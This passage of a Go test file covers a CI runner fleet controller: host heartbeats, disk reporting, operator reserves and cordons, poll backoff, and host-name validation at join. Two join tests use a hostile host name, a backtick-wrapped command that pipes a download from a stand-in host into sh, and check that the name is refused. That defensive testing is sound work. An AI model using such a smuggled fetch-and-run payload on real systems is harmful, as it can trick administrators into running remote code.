		t.Fatalf("last heartbeat was not recorded")
	}
}

// A compose deployment joined under whatever hostname Docker gave its first
// container, before the compose file set one, and kept that random name for
// life: the identity is the persisted credential, so the row is renamed rather
// than joined again. Unless something else already has the name.
func TestAdoptingEmbeddedCredentialsRenamesTheHostToItsConfiguredName(t *testing.T) {
	h := newHarness(t)
	host := h.host("7096d9a9b798")

	h.c.renameEmbeddedHost(h.ctx, host, "zoomies")
	got, err := h.st.GetHost(h.ctx, host.ID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if got.Name != "zoomies" {
		t.Fatalf("name = %q, want the configured one", got.Name)
	}

	// Two hosts called zoomies would be worse than one called by its
	// container ID, so a name that is taken stays where it is.
	other := h.host("0123456789ab")
	h.c.renameEmbeddedHost(h.ctx, other, "zoomies")
	if got, _ := h.st.GetHost(h.ctx, other.ID); got.Name != "0123456789ab" {
		t.Fatalf("name = %q; a taken name must not be duplicated", got.Name)
	}
}

// An operator can rename the embedded host, and the controller coming back up
// must not put the configured name back over their choice.
func TestAnOperatorsRenameOfTheEmbeddedHostSurvivesARestart(t *testing.T) {
	h := newHarness(t)
	host := h.host("front-door")

	h.c.renameEmbeddedHost(h.ctx, host, "zoomies")
	if got, _ := h.st.GetHost(h.ctx, host.ID); got.Name != "front-door" {
		t.Fatalf("name = %q, want the operator's name kept", got.Name)
	}
}

// A host that has been silent past the grace is presumed gone, and the runners
// recorded on it with it: until they are failed they count as capacity, so a
// pool pinned at its maximum by a dead host would create nothing for ever
// while looking healthy. The job a busy one was running is the fleet's
// failure, and is marked as such.
func TestRunnersOnAHostSilentPastTheGraceAreFailedAndTheirJobMarkedLost(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	pool := h.pool(inst, "linux-x64")
	host := h.host("vm-1")
	idle := h.runnerRow(pool, host, store.RunnerIdle)
	busy := h.runnerRow(pool, host, store.RunnerRegistering)
	mustReportRunning(t, h, host.ID, busy.ID)
	h.deliverJob(jobEvent{Action: "in_progress", JobID: 7007, Labels: []string{"linux-x64"}, RunnerName: busy.Name})

	host.LastHeartbeat = time.Now().Add(-hostLostAfter - time.Minute)
	if err := h.st.UpdateHost(h.ctx, host); err != nil {
		t.Fatalf("UpdateHost: %v", err)
	}
	h.c.checkHostHealth(h.ctx)

	for _, id := range []string{idle.ID, busy.ID} {
		after, err := h.st.GetRunner(h.ctx, id)
		if err != nil {
			t.Fatalf("GetRunner: %v", err)
		}
		if after.State != store.RunnerFailed {
			t.Fatalf("runner %s is %q after its host went silent, want %q", id, after.State, store.RunnerFailed)
		}
		if !strings.Contains(after.Message, "vm-1") || !strings.Contains(after.Message, "heartbeat") {
			t.Fatalf("message %q does not say which host went quiet", after.Message)
		}
	}
	job, err := h.st.GetJobByGitHubID(h.ctx, 7007)
	if err != nil {
		t.Fatalf("GetJobByGitHubID: %v", err)
	}
	if job.RunnerFault == "" {
		t.Fatal("the job the busy runner was running was not marked as lost by the fleet")
	}
}

// Unhealthy is not gone. An agent restarting, a daemon being upgraded or a
// network blip all outlast the health timeout, and a host in that state keeps
// its runners until the longer grace has passed.
func TestAHostThatIsMerelyLateKeepsItsRunners(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	pool := h.pool(inst, "linux-x64")
	host := h.host("vm-1")
	r := h.runnerRow(pool, host, store.RunnerIdle)

	host.LastHeartbeat = time.Now().Add(-2 * store.HeartbeatTimeout)
	if err := h.st.UpdateHost(h.ctx, host); err != nil {
		t.Fatalf("UpdateHost: %v", err)
	}
	h.c.checkHostHealth(h.ctx)

	after, err := h.st.GetRunner(h.ctx, r.ID)
	if err != nil {
		t.Fatalf("GetRunner: %v", err)
	}
	if after.State != store.RunnerIdle {
		t.Fatalf("runner is %q on a host that is late but not lost, want %q", after.State, store.RunnerIdle)
	}
}

// A stop the host never confirms would leave the runner draining for ever,
// counted against its pool's maximum and holding a slot on its host. Once the
// task has been given up on, the runner is too.
func TestAStopTheHostNeverConfirmedFailsTheRunner(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	pool := h.pool(inst, "linux-x64")
	host := h.host("vm-1")
	r := h.runnerRow(pool, host, store.RunnerIdle)
	if _, err := h.c.DrainRunner(h.ctx, r.ID, "operator asked", false); err != nil {
		t.Fatalf("DrainRunner: %v", err)
	}
	if !h.hasTaskOfKind(host.ID, agent.TaskStopRunner) {
		t.Fatal("draining did not queue a stop task")
	}

	q := h.c.queues.get(host.ID)
	now := time.Now()
	for attempt := 1; attempt <= maxTaskAttempts; attempt++ {
		if got := q.take(10, now); len(got) != 1 {
			t.Fatalf("attempt %d: took %d tasks, want the stop", attempt, len(got))
		}
		now = now.Add(stopLease + time.Minute)
		h.c.sweepTasks(h.ctx, now)
	}

	after, err := h.st.GetRunner(h.ctx, r.ID)
	if err != nil {
		t.Fatalf("GetRunner: %v", err)
	}
	if after.State != store.RunnerFailed {
		t.Fatalf("runner is %q after its stop was given up on, want %q", after.State, store.RunnerFailed)
	}
	if !strings.Contains(after.Message, "never confirmed") {
		t.Fatalf("message %q does not say the stop was never confirmed", after.Message)
	}
}

// joinedHost joins a host reporting the given disk figures and returns the
// transport, already carrying its credentials, with the host's ID.
func joinedHost(t *testing.T, h *harness, totalMB, freeMB int64) (agent.Transport, string) {
	t.Helper()
	tr := h.c.EmbeddedTransport()
	resp, err := tr.Join(h.ctx, agent.JoinRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Name:            "vm-1",
		Capacity:        4,
		DiskTotalMB:     totalMB,
		DiskFreeMB:      freeMB,
		Backends:        []backend.Info{{Kind: store.BackendDocker, Available: true}},
	})
	if err != nil {
		t.Fatalf("Join: %v", err)
	}
	tr.SetCredentials(resp.HostID, resp.AgentToken)
	return tr, resp.HostID
}

func hostDisk(t *testing.T, h *harness, id string) (totalMB, freeMB int64) {
	t.Helper()
	host, err := h.st.GetHost(h.ctx, id)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	return host.DiskTotalMB, host.DiskFreeMB
}

// A host's disk is what decides whether a runner's checkout and its caches
// have anywhere to go, and until now the agent measured none of it.
func TestAHostReportsTheDiskItsRunnersWillUse(t *testing.T) {
	h := newHarness(t)
	_, id := joinedHost(t, h, 500_000, 200_000)

	total, free := hostDisk(t, h, id)
	if total != 500_000 || free != 200_000 {
		t.Fatalf("disk = %d total, %d free; want what the agent reported", total, free)
	}
}

// Free space is the one figure an agent reports that moves on its own: a job
// unpacking a cache changes it, and so does the job next door. A heartbeat
// arrives every thirty seconds per host, so recording every difference turns a
// fleet's heartbeats into one row write per host per beat for a number that is
// never exactly the same twice.
func TestASmallChangeInFreeDiskIsNotWorthAWrite(t *testing.T) {
	h := newHarness(t)
	tr, id := joinedHost(t, h, 500_000, 200_000)

	// One percent down, which is what a job starting looks like.
	if _, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{
		ProtocolVersion: agent.ProtocolVersion,
		DiskTotalMB:     500_000,
		DiskFreeMB:      198_000,
	}); err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}

	if _, free := hostDisk(t, h, id); free != 200_000 {
		t.Fatalf("free = %d; a drift this small must not rewrite the row", free)
	}
}

// Far enough is another matter: a host filling up is exactly what an operator
// needs to see, and what placement will need to read.
func TestADiskThatHasReallyMovedIsRecorded(t *testing.T) {
	h := newHarness(t)
	tr, id := joinedHost(t, h, 500_000, 200_000)

	if _, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{
		ProtocolVersion: agent.ProtocolVersion,
		DiskTotalMB:     500_000,
		DiskFreeMB:      40_000,
	}); err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}

	if _, free := hostDisk(t, h, id); free != 40_000 {
		t.Fatalf("free = %d, want the 40000 the agent reported", free)
	}
}

// An agent too old to measure disk, or one on a platform with no portable way
// to ask, sends nothing. Nothing must not overwrite something: a zero read as
// a full disk would take a host out of service on an upgrade, which is the
// opposite of what reporting more about a host is for.
func TestAnAgentThatCannotMeasureDiskDoesNotEraseWhatIsKnown(t *testing.T) {
	h := newHarness(t)
	tr, id := joinedHost(t, h, 500_000, 200_000)

	// The beat carries a new version, so the row is rewritten for a reason
	// that has nothing to do with the disk. Without a beat that writes at all,
	// this would pass on the tolerance alone and say nothing about whether a
	// silent agent's zero can reach the row.
	if _, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Version:         "0.3-beta",
	}); err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}
	after, err := h.st.GetHost(h.ctx, id)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if after.Version != "0.3-beta" {
		t.Fatalf("version = %q; the beat has to have rewritten the row for this to mean anything", after.Version)
	}

	total, free := hostDisk(t, h, id)
	if total != 500_000 || free != 200_000 {
		t.Fatalf("disk = %d total, %d free; a silent agent erased what was known", total, free)
	}
}

// The first measurement always lands, however small the number, because going
// from "not measured" to a figure is the difference between a host that can be
// placed on by disk and one that cannot.
func TestTheFirstDiskMeasurementIsAlwaysRecorded(t *testing.T) {
	h := newHarness(t)
	// The total is already known, so only the free figure is new. Letting the
	// total change too would carry the write on its own and say nothing about
	// how a first free-space measurement is treated.
	tr, id := joinedHost(t, h, 500_000, 0)

	if _, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{
		ProtocolVersion: agent.ProtocolVersion,
		DiskTotalMB:     500_000,
		DiskFreeMB:      10,
	}); err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}

	if _, free := hostDisk(t, h, id); free != 10 {
		t.Fatalf("free = %d; a first measurement is smaller than any tolerance and must still land", free)
	}
}

// The tolerance itself, branch by branch. The heartbeat tests above prove the
// wiring; this proves the rule, including the two cases whose only effect is a
// row write that does not happen -- which nothing outside this package can see.
func TestWhenFreeDiskIsWorthAWrite(t *testing.T) {
	tests := []struct {
		name     string
		was, now int64
		measured bool
		want     bool
	}{
		{"a first measurement, however small", 0, 10, true, true},
		{"an agent that cannot measure says nothing", 200_000, 0, false, false},
		{"neither figure known", 0, 0, false, false},
		{"a job starting, on a large disk", 200_000, 198_000, true, false},
		{"a disk filling up", 200_000, 40_000, true, true},
		{"freed by a cache eviction", 40_000, 200_000, true, true},
		{"a small disk, drifting under the floor", 1_000, 900, true, false},
		{"a small disk, past the floor", 1_000, 700, true, true},
		// The pair that cannot share an encoding. A host with nothing left is
		// the one state where being out of date does real harm, and it reads
		// as the same zero an agent too old to look sends.
		{"a disk that has actually filled up", 200_000, 0, true, true},
		{"a full disk that is still full", 0, 0, true, false},
		{"the first space freed on a full disk", 0, 5_000, true, true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := diskFreeMoved(tc.was, tc.now, tc.measured); got != tc.want {
				t.Fatalf("diskFreeMoved(%d, %d, measured=%v) = %v, want %v",
					tc.was, tc.now, tc.measured, got, tc.want)
			}
		})
	}
}

// The state an operator most needs to see, end to end: an agent reporting a
// disk with nothing left on it, which reads as the same zero that an agent too
// old to measure sends. Getting these two the same way round leaves a full host
// describing itself with the last comfortable figure it ever reported.
func TestAFullDiskIsRecordedRatherThanReadAsSilence(t *testing.T) {
	h := newHarness(t)
	tr, id := joinedHost(t, h, 500_000, 200_000)

	if _, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{
		ProtocolVersion: agent.ProtocolVersion,
		DiskTotalMB:     500_000,
		DiskFreeMB:      0,
	}); err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}

	total, free := hostDisk(t, h, id)
	if free != 0 {
		t.Fatalf("free = %d MB on a host that reported none left", free)
	}
	if total != 500_000 {
		t.Fatalf("total = %d MB; the size is what says the reading happened", total)
	}
}

// The reserve is the operator's, like capacity. An agent reports what it sees
// and never writes this, or a host could talk its way out of the room its
// operator held back for it.
func TestAHeartbeatNeverWritesTheOperatorsReserve(t *testing.T) {
	h := newHarness(t)
	tr, id := joinedHost(t, h, 500_000, 200_000)

	if err := h.st.SetHostReserve(h.ctx, id, 2, 4096, 50_000); err != nil {
		t.Fatalf("SetHostReserve: %v", err)
	}

	if _, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{
		ProtocolVersion: agent.ProtocolVersion,
		DiskTotalMB:     500_000,
		DiskFreeMB:      40_000,
	}); err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}

	after, err := h.st.GetHost(h.ctx, id)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if after.ReserveCPUs != 2 || after.ReserveMemoryMB != 4096 || after.ReserveDiskMB != 50_000 {
		t.Fatalf("reserve = %d cpus, %d MB, %d MB disk; a heartbeat overwrote the operator's",
			after.ReserveCPUs, after.ReserveMemoryMB, after.ReserveDiskMB)
	}
	// And the observation it carried did land, so this is not passing because
	// the whole write was skipped.
	if _, free := hostDisk(t, h, id); free != 40_000 {
		t.Fatalf("free = %d; the heartbeat's own observation was lost", free)
	}
}

// A re-join is the agent's doing -- a rebuilt machine reclaiming its row, or an
// embedded agent whose credentials no longer match -- and it replaces the row
// wholesale. Letting the reserve drop there would be the agent writing it after
// all, by the back door and silently: the row keeps its id, its cordon and its
// labels, so nothing looks wrong until the controller places into the space the
// operator held back.
func TestARejoinKeepsTheOperatorsReserve(t *testing.T) {
	h := newHarness(t)
	tr, id := joinedHost(t, h, 500_000, 200_000)
	_ = tr

	if err := h.st.SetHostReserve(h.ctx, id, 2, 4096, 50_000); err != nil {
		t.Fatalf("SetHostReserve: %v", err)
	}
	before, err := h.st.GetHost(h.ctx, id)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	before.Cordoned = true
	if err := h.st.UpdateHost(h.ctx, before); err != nil {
		t.Fatalf("UpdateHost: %v", err)
	}

	// The same machine, joining again under its own name with a fresh token.
	again := h.c.EmbeddedTransport()
	resp, err := again.Join(h.ctx, agent.JoinRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Name:            "vm-1",
		Capacity:        4,
		Backends:        []backend.Info{{Kind: store.BackendDocker, Available: true}},
	})
	if err != nil {
		t.Fatalf("re-Join: %v", err)
	}

	after, err := h.st.GetHost(h.ctx, resp.HostID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if after.ReserveCPUs != 2 || after.ReserveMemoryMB != 4096 || after.ReserveDiskMB != 50_000 {
		t.Fatalf("reserve = %d cpus, %d MB, %d MB disk after a re-join; the operator's must survive it",
			after.ReserveCPUs, after.ReserveMemoryMB, after.ReserveDiskMB)
	}
	// The cordon is carried across for the same reason and is the proof that
	// this row really was replaced rather than left alone.
	if !after.Cordoned {
		t.Fatal("the cordon did not survive the re-join either, so this is not testing what it claims")
	}
}

// stringsIn returns every string in a marshalled JSON document, keys included,
// so a secret is found wherever it was put and whatever escaping it picked up
// on the way.
func stringsIn(t *testing.T, doc []byte) []string {
	t.Helper()
	var v any
	if err := json.Unmarshal(doc, &v); err != nil {
		t.Fatalf("unmarshalling to walk it: %v", err)
	}
	var out []string
	var walk func(any)
	walk = func(n any) {
		switch n := n.(type) {
		case string:
			out = append(out, n)
		case []any:
			for _, e := range n {
				walk(e)
			}
		case map[string]any:
			for k, e := range n {
				out = append(out, k)
				walk(e)
			}
		}
	}
	walk(v)
	return out
}

func truncateValue(s string) string {
	if len(s) > 120 {
		return s[:120] + "..."
	}
	return s
}

// A controller holding more polls than it wants to asks the agents it answers
// to come back less often. The pressure it is shedding is the fleet's size
// rather than its workload -- an idle host still costs a held connection --
// so nothing else about the fleet says it is happening.
func TestATaskPollFindingNothingIsAskedToWaitWhenTheControllerIsHoldingTooMany(t *testing.T) {
	h := newHarness(t)
	h.c.pollsInFlight.Store(pollShedThreshold * 2)

	batch, err := h.c.PollTasks(h.ctx, "host_quiet", 10*time.Millisecond)
	if err != nil {
		t.Fatalf("PollTasks: %v", err)
	}
	if batch.Backoff <= 0 {
		t.Fatalf("batch = %+v, want a backoff: %d polls are in flight and the threshold is %d",
			batch, h.c.pollsInFlight.Load(), pollShedThreshold)
	}
}

// Work is never delayed to shed load. The long poll exists so that a task
// reaches its host in the instant it is queued, and a controller that held a
// created runner back for fifteen seconds because it was busy would be slower
// exactly when the fleet needed it to be quick.
func TestABatchWithWorkInItIsNeverAskedToWait(t *testing.T) {
	h := newHarness(t)
	h.c.pollsInFlight.Store(pollShedThreshold * 10)
	h.c.enqueue("host_busy", agent.Task{Kind: agent.TaskRemoveRunner, RunnerID: "run_1"})

	batch, err := h.c.PollTasks(h.ctx, "host_busy", 10*time.Millisecond)
	if err != nil {
		t.Fatalf("PollTasks: %v", err)
	}
	if len(batch.Tasks) != 1 {
		t.Fatalf("batch = %+v, want the queued task", batch)
	}
	if batch.Backoff != 0 {
		t.Fatalf("batch carries a %s backoff with work in it", batch.Backoff)
	}
}

// A quiet fleet is asked for nothing at all, so the mechanism costs a single
// deployment nothing.
func TestShedForAsksAFleetUnderTheThresholdForNothing(t *testing.T) {
	for _, inFlight := range []int64{0, 1, pollShedThreshold} {
		if got := shedFor(inFlight); got != 0 {
			t.Errorf("shedFor(%d) = %s, want no wait at all", inFlight, got)
		}
	}
}

// The wait rises with the excess rather than switching on: a step would move
// the whole fleet between two duty cycles at once and oscillate around the
// threshold. It is capped, because a fleet twice the size it should be is
// still a fleet that has to start runners.
func TestTheShedWaitRisesWithTheExcessAndIsCapped(t *testing.T) {
	small, large := shedFor(pollShedThreshold+8), shedFor(pollShedThreshold+64)
	if small <= 0 || large <= small {
		t.Fatalf("waits of %s then %s: a bigger excess should ask for a longer wait", small, large)
	}
	if got := shedFor(pollShedThreshold * 100); got != maxPollShed {
		t.Fatalf("shedFor(a hundred times over) = %s, want the %s cap", got, maxPollShed)
	}
}

// TestAHeartbeatDoesNotUndoAnOperatorsCordon covers the window between reading
// a host row and writing it back.
//
// The heartbeat reads the host at the top of the request and, when anything the
// agent reports has moved, wrote the whole row back. An operator who cordoned
// the machine in the interval had their change overwritten with the pre-edit
// value -- no error, nothing in the log, and the UI still showing it cordoned
// because the cordon handler had already published its own view. The scheduler
// reads the row, so the next pass puts runners on the machine somebody is about
// to power off.
//
// The store already draws this line for the reserves, whose comment says a host
// must not be able to talk its way out of the room its operator held back for
// it. A cordon is the same thing said more loudly.
func TestAHeartbeatDoesNotUndoAnOperatorsCordon(t *testing.T) {
	h := newHarness(t)
	tr := h.c.EmbeddedTransport()

	resp, err := tr.Join(h.ctx, agent.JoinRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Name:            "builder-1",
		Capacity:        4,
		OS:              "linux",
		Arch:            "amd64",
		Backends:        []backend.Info{{Kind: store.BackendDocker, Available: true, Version: "27.1.1"}},
	})
	if err != nil {
		t.Fatalf("Join: %v", err)
	}
	tr.SetCredentials(resp.HostID, resp.AgentToken)

	// The operator cordons the host for maintenance, and renames it.
	if err := h.st.SetHostCordoned(h.ctx, resp.HostID, true); err != nil {
		t.Fatalf("SetHostCordoned: %v", err)
	}

	// A heartbeat arrives carrying something new, so the row is written. The
	// agent's copy of the host still says uncordoned.
	if _, err := tr.Heartbeat(h.ctx, agent.HeartbeatRequest{
		ProtocolVersion: agent.ProtocolVersion,
		Capacity:        4,
		Version:         "1.2.3",
		CPUs:            16,
		MemoryMB:        32768,
		Backends: []backend.Info{{
			Kind: store.BackendDocker, Available: true, Version: "27.2.0",
		}},
	}); err != nil {
		t.Fatalf("Heartbeat: %v", err)
	}

	host, err := h.st.GetHost(h.ctx, resp.HostID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if !host.Cordoned {
		t.Error("the heartbeat uncordoned a host its operator had just cordoned")
	}
	// And what the agent legitimately reports still lands, or the narrower
	// write has thrown away the point of the heartbeat.
	if host.Version != "1.2.3" || host.CPUs != 16 || host.MemoryMB != 32768 {
		t.Errorf("host = version %q cpus %d memory %d, want the values the agent reported",
			host.Version, host.CPUs, host.MemoryMB)
	}
	if info, ok := host.BackendInfo.Find(store.BackendDocker); !ok || info.Version != "27.2.0" {
		t.Errorf("backend info = %+v, want the version the agent reported", host.BackendInfo)
	}
}

// A host that changes its name on upgrade must still be one host.
//
// The name is not stable: it is derived from what the machine is, so an agent
// that has learnt to measure its own CPUs and memory computes a different one
// from an agent that had not. The reclaim was keyed on the name alone, so
// upgrading such a host enrolled it a second time -- a new row with the correct
// figures, beside the old row still being kept alive by the process that had
// not been restarted yet. The operator saw one machine as two, one of them
// reporting nothing, and neither of them wrong exactly.
//
// The id the agent already keeps in its credentials file is what settles it.
// The token is still the proof; the id only says which row the proof is about.
func TestAnUpgradedAgentThatRenamesItselfReclaimsItsOwnRow(t *testing.T) {
	h := newHarness(t)

	// As it was: the bare hostname, which is what an older agent sent.
	first, err := h.c.Join(h.ctx, joinRequest("Ollama1", h.joinToken(t, nil, 0)), "10.0.0.9")
	if err != nil {
		t.Fatalf("first join: %v", err)
	}

	// As it is after the upgrade: the same machine, describing itself.
	renamed := joinRequest("zoomies-4vcpu-8gb-debian-12-ollama1", h.joinToken(t, nil, 0))
	renamed.PreviousToken = first.AgentToken
	renamed.PreviousHostID = first.HostID
	second, err := h.c.Join(h.ctx, renamed, "10.0.0.9")
	if err != nil {
		t.Fatalf("re-join under a new name: %v", err)
	}
	if second.HostID != first.HostID {
		t.Errorf("host ID = %s, want %s: the machine was enrolled a second time instead of reclaiming its row",
			second.HostID, first.HostID)
	}

	hosts, err := h.st.ListHosts(h.ctx)
	if err != nil {
		t.Fatalf("ListHosts: %v", err)
	}
	var named int
	for _, host := range hosts {
		if host.ID == first.HostID {
			named++
			if host.Name != "zoomies-4vcpu-8gb-debian-12-ollama1" {
				t.Errorf("the reclaimed row kept the old name %q, so the Hosts page still says what the machine was", host.Name)
			}
		}
	}
	if named != 1 {
		t.Fatalf("found %d rows for the reclaimed host, want 1", named)
	}
	if len(hosts) != 1 {
		names := make([]string, 0, len(hosts))
		for _, host := range hosts {
			names = append(names, host.Name)
		}
		t.Errorf("one machine left %d host rows: %s", len(hosts), strings.Join(names, ", "))
	}

	// The id is a claim, not a credential. Naming somebody else's row without
	// their token still gets nowhere.
	_, _, other := h.fleet()
	thief := joinRequest("anything-at-all", h.joinToken(t, nil, 0))
	thief.PreviousHostID = other.ID
	if _, err := h.c.Join(h.ctx, thief, "10.0.0.66"); err == nil {
		t.Error("a join claimed another host's row by naming its id, with no token to prove it")
	}
}

// ---------------------------------------------------------------------------
// Join: what a host may call itself
// ---------------------------------------------------------------------------

// A host's name is chosen by its agent and is then written into the problems
// list, where the UI draws a backtick pair as a command with a copy button. A
// join token only proves the agent was let in, not that what it says about
// itself is safe to show an administrator, so the join refuses a name that
// could pass for a command -- and does it before it redeems the token, so the
// person who typed the name wrong keeps a token they can use.
func TestJoinRefusesAHostNameThatCouldPassForACommand(t *testing.T) {
	const hostile = "a`curl evil.example|sh`b"
	for name, host := range map[string]string{
		"a backtick pair around a command": hostile,
		"a lone backtick":                  "build`box",
		"a line break":                     "two\nlines",
		"a control character":              "build\x1b[31mbox",
		"a paragraph":                      strings.Repeat("a", 129),
	} {
		t.Run(name, func(t *testing.T) {
			h := newHarness(t)
			token := h.joinToken(t, nil, 0)

			resp, err := h.c.Join(h.ctx, joinRequest(host, token), "10.0.0.9")
			if err == nil {
				t.Fatalf("a host named %q enrolled and got %+v", host, resp)
			}
			// The agent's operator can fix this, so it is a refusal with the
			// reason, not a 500 with a request ID.
			if !errors.Is(err, auth.ErrInvalidInput) {
				t.Errorf("error = %v, want one the API answers with its reason", err)
			}
			// It says how to fix it, in the voice of the empty-name refusal,
			// and does not repeat what it refuses.
			for _, want := range []string{"--name", "agent.name"} {
				if !strings.Contains(err.Error(), want) {
					t.Errorf("the refusal should mention %q: %v", want, err)
				}
			}
			if strings.Contains(err.Error(), "evil.example") {
				t.Errorf("the refusal repeats the name it refuses: %v", err)
			}
			hosts, lerr := h.st.ListHosts(h.ctx)
			if lerr != nil {
				t.Fatalf("ListHosts: %v", lerr)
			}
			if len(hosts) != 0 {
				t.Fatalf("a refused join left %d host row(s) behind", len(hosts))
			}

			// Nothing was redeemed: the same token enrols the same machine once
			// it has a name that is allowed.
			if _, err := h.c.Join(h.ctx, joinRequest("build-box", token), "10.0.0.9"); err != nil {
				t.Fatalf("the token was spent by a refused join: %v", err)
			}
		})
	}
}

// The names the fleet already uses must keep joining. A rule that refused one
// would turn an upgrade into an outage for a machine that had worked for months.
func TestJoinStillAcceptsEveryShapeOfNameAFleetUses(t *testing.T) {
	for _, host := range []string{
		"zoomies-16vcpu-32gb-ubuntu-2404-build01",
		"ip-10-0-31-44.eu-west-1.compute.internal",
		"7096d9a9b798",
		"Build Box 1",
		"büro-rechner",
		strings.Repeat("a", 128),
	} {
		h := newHarness(t)
		if _, err := h.c.Join(h.ctx, joinRequest(host, h.joinToken(t, nil, 0)), "10.0.0.9"); err != nil {
			t.Errorf("join as %q: %v", host, err)
		}
	}
}

// A host enrolled before the rule existed is working now and must go on
// working. Refusing its next join -- after a rebuild, say, or an agent
// upgrade that dropped its credentials -- would take a machine out of the fleet
// because of a name nobody asked it to change. Its name is shown neutralised
// wherever a sentence uses it, and an operator can rename it when they choose.
func TestAHostEnrolledUnderANowRefusedNameCanStillJoinAgain(t *testing.T) {
	const legacy = "build`box"
	h := newHarness(t)

	plaintext, hash := auth.NewAgentToken()
	old := &store.Host{
		Name: legacy, Capacity: 2, Backends: store.StringSlice{"docker"}, Labels: store.StringMap{},
		OS: "linux", Arch: "amd64", LastHeartbeat: time.Now(), TokenHash: hash,
	}
	if err := h.st.CreateHost(h.ctx, old); err != nil {
		t.Fatalf("CreateHost: %v", err)
	}

	// The machine itself, which still holds the token it was issued.
	req := joinRequest(legacy, h.joinToken(t, nil, 0))
	req.PreviousToken = plaintext
	resp, err := h.c.Join(h.ctx, req, "10.0.0.9")
	if err != nil {
		t.Fatalf("a host already enrolled under %q could not join again: %v", legacy, err)
	}
	if resp.HostID != old.ID {
		t.Errorf("host ID = %s, want its own row (%s)", resp.HostID, old.ID)
	}

	// The embedded agent joins on every start, from the operator's own
	// configuration, with no token to show. It is never refused for its name:
	// a single-VM controller would have no host at all.
	if _, err := h.c.EmbeddedTransport().Join(h.ctx, agent.JoinRequest{
		ProtocolVersion: agent.ProtocolVersion, Name: "embedded`box", Capacity: 1,
	}); err != nil {
		t.Errorf("the embedded agent was refused its configured name: %v", err)
	}
}

// The exemption is for the name a host already has and nothing else: a host
// that is re-joining may not use the occasion to take a new name the rule
// refuses.
func TestAnEnrolledHostCannotJoinAgainUnderANewRefusedName(t *testing.T) {
	h := newHarness(t)
	plaintext, hash := auth.NewAgentToken()
	old := &store.Host{
		Name: "build-box", Capacity: 2, Backends: store.StringSlice{"docker"}, Labels: store.StringMap{},
		OS: "linux", Arch: "amd64", LastHeartbeat: time.Now(), TokenHash: hash,
	}
	if err := h.st.CreateHost(h.ctx, old); err != nil {
		t.Fatalf("CreateHost: %v", err)
	}

	req := joinRequest("a`curl evil.example|sh`b", h.joinToken(t, nil, 0))
	req.PreviousHostID = old.ID
	req.PreviousToken = plaintext
	if resp, err := h.c.Join(h.ctx, req, "10.0.0.9"); err == nil {
		t.Fatalf("a re-joining host took a refused name and got %+v", resp)
	}
	after, err := h.st.GetHost(h.ctx, old.ID)
	if err != nil {
		t.Fatalf("a refused join removed the host: %v", err)
	}
	if after.Name != "build-box" {
		t.Errorf("name = %q after a refused join, want it untouched", after.Name)
	}
}
